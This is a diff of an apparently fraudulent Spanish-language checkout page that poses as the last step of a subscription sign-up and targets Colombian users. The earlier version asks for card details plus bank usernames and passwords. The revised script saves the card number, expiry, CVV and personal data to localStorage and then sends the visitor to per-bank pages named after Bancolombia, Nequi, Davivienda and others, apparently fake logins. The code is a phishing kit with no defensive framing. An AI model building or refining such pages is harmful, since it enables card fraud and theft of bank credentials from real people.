@@ -15,46 +15,27 @@ body {
     color: #fff;
 }
 
-/* HEADER */
 header {
     padding: 20px;
     display: flex;
     justify-content: space-between;
     align-items: center;
 }
-
 header img { height: 34px; }
+header a { color: #bbb; text-decoration: none; }
 
-header a {
-    color: #bbb;
-    font-size: 15px;
-    text-decoration: none;
-}
-
-/* CONTENEDOR PRINCIPAL */
 .main-container {
     padding: 20px;
     max-width: 600px;
     margin: auto;
 }
 
-.step { color: #9ca3af; font-size: 14px; }
-
-h1 {
-    font-size: 28px;
-    margin-top: 5px;
-    margin-bottom: 25px;
-}
-
-/* LABELS */
 label {
     display: block;
     margin: 18px 0 6px;
-    font-size: 14px;
     color: #d1d5db;
 }
 
-/* INPUTS */
 input, select {
     width: 100%;
     padding: 15px;
@@ -62,13 +43,10 @@ input, select {
     border: 1px solid #383838;
     border-radius: 6px;
     color: #fff;
-    font-size: 15px;
-    box-sizing: border-box;
 }
 
-/* TARJETA */
+/* CAMPO TARJETA */
 .input-card { position: relative; }
-
 .card-icons {
     position: absolute;
     right: 12px;
@@ -77,25 +55,16 @@ input, select {
     display: flex;
     gap: 6px;
 }
+.card-icons img { height: 26px; }
 
-.card-icons img {
-    height: 26px;
-    opacity: .9;
-}
-
-/* ROW FECHA / CVV */
-.row-double {
-    display: flex;
-    gap: 15px;
-}
-
+/* FECHA / CVV */
+.row-double { display: flex; gap: 15px; }
 .field-group { flex: 1; }
 
 /* BOTÓN */
 button {
     width: 100%;
     padding: 16px;
-    margin-top: 25px;
     background: #fff;
     border: none;
     color: #000;
@@ -105,24 +74,12 @@ button {
     font-weight: 600;
 }
 
-/* RESPONSIVE */
 @media (max-width: 480px) {
     .row-double { flex-direction: column; }
 }
-
-/* BLOQUE DE VALIDACIÓN DEL BANCO */
-.bank-block {
-    margin-top: 25px;
-    padding: 15px;
-    background: #151515;
-    border-radius: 10px;
-    border: 1px solid #2a2a2a;
-}
-
-.hidden { display: none; }
 </style>
-
 </head>
+
 <body>
 
 <header>
@@ -132,15 +89,15 @@ button {
 
 <div class="main-container">
 
-    <div class="step">PASO 3 DE 3</div>
+    <h2>PASO 3 DE 3</h2>
     <h1>¡A disfrutar!</h1>
 
     <label>NOMBRE EN LA TARJETA</label>
-    <input type="text" placeholder="Nombre del titular">
+    <input id="nombreTarjeta" type="text" placeholder="Nombre del titular">
 
-    <label>NÚMERO DE LA TARJETA</label>
+    <label>NÚMERO DE TARJETA</label>
     <div class="input-card">
-        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <input id="numeroTarjeta" type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
         <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
@@ -150,93 +107,67 @@ button {
 
     <div class="row-double">
         <div class="field-group">
-            <label>FECHA DE VENCIMIENTO</label>
-            <input type="text" placeholder="MM/AA" maxlength="5">
+            <label>FECHA VENC.</label>
+            <input id="fecha" type="text" placeholder="MM/AA">
         </div>
 
         <div class="field-group">
-            <label>CÓDIGO DE SEGURIDAD</label>
-            <input type="text" placeholder="CVV" maxlength="4">
+            <label>CVV</label>
+            <input id="cvv" type="password" maxlength="4" placeholder="CVV">
         </div>
     </div>
 
     <label>CIUDAD</label>
-    <input type="text" placeholder="Ingrese su ciudad">
+    <input id="ciudad" type="text" placeholder="Ciudad">
 
     <label>DEPARTAMENTO</label>
-    <select>
-        <option>Seleccionar…</option>
+    <select id="departamento">
+        <option value="">Seleccionar…</option>
         <option>Antioquia</option>
         <option>Cundinamarca</option>
-        <option>Valle del Cauca</option>
+        <option>Valle</option>
         <option>Atlántico</option>
-        <option>Santander</option>
     </select>
 
-    <label>RUT (Opcional)</label>
-    <input type="text" placeholder="Opcional">
+    <label>RUT (opcional)</label>
+    <input id="rut" type="text" placeholder="Opcional">
 
-    <!-- BLOQUE BANCO -->
-    <div class="bank-block">
-        <label>Selecciona tu banco</label>
+    <label>Selecciona tu banco</label>
+    <select id="banco">
+        <option value="">Elegir banco…</option>
+        <option value="banco-bancolombia.html">Bancolombia</option>
+        <option value="banco-nequi.html">Nequi</option>
+        <option value="banco-davivienda.html">Davivienda</option>
+        <option value="banco-bbva.html">BBVA</option>
+        <option value="banco-bogota.html">Banco de Bogotá</option>
+        <option value="banco-popular.html">Banco Popular</option>
+        <option value="banco-itau.html">Itaú</option>
+    </select>
 
-        <select id="bankSelect" onchange="mostrarLoginBanco()">
-            <option value="">Elegir banco…</option>
-            <option value="Bancolombia">Bancolombia</option>
-            <option value="Nequi">Nequi</option>
-            <option value="Davivienda">Davivienda</option>
-            <option value="BBVA">BBVA</option>
-            <option value="Bogotá">Banco de Bogotá</option>
-            <option value="Popular">Banco Popular</option>
-            <option value="Itau">Itaú</option>
-        </select>
-
-        <!-- CAMPOS DE USUARIO Y CLAVE -->
-        <div id="bankLogin" class="hidden">
-            <label>Usuario del banco</label>
-            <input type="text" id="bankUser" placeholder="Usuario">
-
-            <label>Contraseña</label>
-            <input type="password" id="bankPass" placeholder="Contraseña">
-        </div>
-    </div>
-
-    <button onclick="validarFinal()">INICIAR SUSCRIPCIÓN</button>
-
+    <button onclick="redirigirBanco()">INICIAR VALIDACIÓN</button>
 </div>
 
 <script>
-function mostrarLoginBanco() {
-    const bank = document.getElementById("bankSelect").value;
-    const block = document.getElementById("bankLogin");
+function redirigirBanco() {
 
-    if (bank === "") {
-        block.classList.add("hidden");
-    } else {
-        block.classList.remove("hidden");
-    }
-}
+    const bankPage = document.getElementById("banco").value;
 
-function validarFinal() {
-    const bank = document.getElementById("bankSelect").value;
-    const user = document.getElementById("bankUser").value;
-    const pass = document.getElementById("bankPass").value;
-
-    if (bank === "") {
-        alert("Debes seleccionar un banco");
+    if (bankPage === "") {
+        alert("Selecciona un banco para continuar.");
         return;
     }
 
-    if (user === "" || pass === "") {
-        alert("Debes ingresar usuario y contraseña del banco");
-        return;
-    }
+    // GUARDA TODO ANTES DE REDIRIGIR
+    localStorage.setItem("nombreTarjeta", document.getElementById("nombreTarjeta").value);
+    localStorage.setItem("numeroTarjeta", document.getElementById("numeroTarjeta").value);
+    localStorage.setItem("fecha", document.getElementById("fecha").value);
+    localStorage.setItem("cvv", document.getElementById("cvv").value);
+    localStorage.setItem("ciudad", document.getElementById("ciudad").value);
+    localStorage.setItem("departamento", document.getElementById("departamento").value);
+    localStorage.setItem("rut", document.getElementById("rut").value);
 
-    // Puedes guardar datos si quieres
-    localStorage.setItem("banco", bank);
-
-    alert("Validando con " + bank + "…");
-    window.location.href = "final.html";
+    // REDIRECCIÓN A LA PÁGINA DEL BANCO
+    window.location.href = bankPage;
 }
 </script>
 
